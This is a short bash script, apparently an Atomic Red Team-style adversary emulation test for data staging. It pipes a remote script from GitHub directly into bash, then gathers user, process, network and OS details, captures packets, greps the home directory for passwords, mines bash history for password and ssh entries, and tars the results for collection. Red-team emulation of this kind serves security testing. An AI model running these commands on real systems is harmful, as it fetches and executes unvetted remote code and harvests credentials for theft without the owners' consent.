#! /bin/bash
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/master/atomics/collection/T1074/src/Discovery.sh | bash -s > ~/output/discovery.log
users >> ~/output/users.txt
w >> ~/output/users.txt
who >> ~/output/users.txt
netstat >> ~/output/network.txt
ps >> ~/output/loot.txt
ps aux >> ~/output/loot.txt
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt
tcpdump -c 5 -nnni enp0s17 -w ~/output/webtcp.pcap
grep -ri --exclude-dir=output --exclude-dir=Desktop password ~/ >> ~/output/pwd.txt
cat ~/.bash_history | grep -e '-p' -e 'pass' -e 'ssh' > ~/output/bash_his.txt
tar -cvzf ~/output.tar.gz ~/output/
